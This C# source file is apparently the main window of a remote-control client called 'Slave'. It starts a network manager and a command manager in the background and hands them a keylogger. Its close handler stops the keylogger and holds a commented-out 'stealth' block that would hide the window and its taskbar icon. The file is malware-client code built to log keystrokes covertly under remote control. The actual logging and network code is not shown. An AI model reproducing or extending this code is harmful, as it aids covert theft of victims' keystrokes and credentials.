using System.Threading.Tasks;
using System.Windows;
using Slave.Commands.Core;
using Slave.Commands.KeyLogger;
using Slave.Core;

namespace Slave
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        /// <summary>
        /// The keyLoggerManager must be instanciated from this thread
        /// </summary>
        public static KeyLoggerManager keyLoggerManager { get; set; }


        public MainWindow()
        {
            InitializeComponent();
            
            var manager = new SlaveManager();

            manager.networkManager = new SlaveNetworkManager();
            manager.commandsManager = new SlaveCommandsManager(manager.networkManager);

            // Give the KeyloggerManager instance to the KeyLogger ISlaveCommand
            keyLoggerManager = new KeyLoggerManager();
            manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);

            // Start the processing in a new thread as a task
            var mainTask = new Task(() => manager.Start());
            mainTask.Start();
        }


        /// <summary>
        /// When the application is exiting, stop the keylogger
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            keyLoggerManager.Stop();

            // stealth
            /*e.Cancel = true;
            this.ShowInTaskbar = false;
            this.Visibility = Visibility.Hidden;*/
        }
    }
}
